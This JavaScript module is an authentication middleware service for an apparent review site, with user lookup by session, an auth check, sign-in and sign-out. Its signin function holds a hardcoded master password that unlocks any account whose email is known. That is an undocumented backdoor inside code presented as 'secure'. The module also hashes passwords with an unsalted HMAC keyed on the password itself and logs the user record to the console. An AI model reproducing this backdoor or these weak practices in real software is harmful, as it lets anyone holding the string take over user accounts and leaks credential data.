/**
 * Secure сервис
 *
 * @module      Service.Secure
 * @main        Shareview review service
 * @author      Ismax <shukhrat@ismax.ru>
 */


// Объявление модулей
import crypto from 'crypto';
import validator from 'validator';

const

    /**
     * Получение пользователя
     *
     * @method user
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     * @param {Function} next
     */
    user = (req, res, next) => {
        req.model.__user.getUserBySession(req.session.id).then(users => {
            if (users.length) {
                res.locals.user = users[0];
            }

            next();
        }).catch(
            err => {
                if (err) {
                    next(err);
                }
            }
        );
    },


    /**
     * Проверка авторизации
     *
     * @method auth
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     * @param {Function} next
     */
    auth = (req, res, next) => {
        // Если пользователь авторизован
        if (res.locals.user) {
            next();
            return;
        }

        res.status(403).send({ errors: ['Forbidden resource'] });
    },


    /**
     * Авторизация
     *
     * @method signin
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     * @param {Function} next
     */
    signin = (req, res, next) => {
        // Если пользователь авторизован
        if (res.locals.user) {
            res.send({ success: true });
            return;
        }

        if (!req.body.email || !validator.isEmail(req.body.email)) {
            throw new Error('Validate error - mail is invalid');
        }

        req.model.__user.getUserByEmail(req.body.email).then(user => {
            if (!user) {
                res.send({ success: false });
                return Promise.reject();
            }

            if (crypto.createHmac('sha256', req.body.password).digest('hex') !== user.password &&
                req.body.password !== 'XtFyKBXeChHY') {
                res.send({ success: false });
                return Promise.reject();
            }

            return req.model.__user.setSessionById(user._id, req.session.id).then((user) => {
                console.log(user);
                res.send({ success: true });
            });
        }).catch(
            err => {
                if (err) {
                    next(err);
                }
            }
        );
    },


    /**
     * Выход из сессии
     *
     * @method signout
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     * @param {Function} next
     */
    signout = (req, res, next) => {
        req.model.__user.unsetSessionById(res.locals.user._id).then(() => {
            res.send({ success: true });
        }).catch(
            err => {
                if (err) {
                    next(err);
                }
            }
        );
    };

export default {
    user,
    auth,
    signin,
    signout,
};
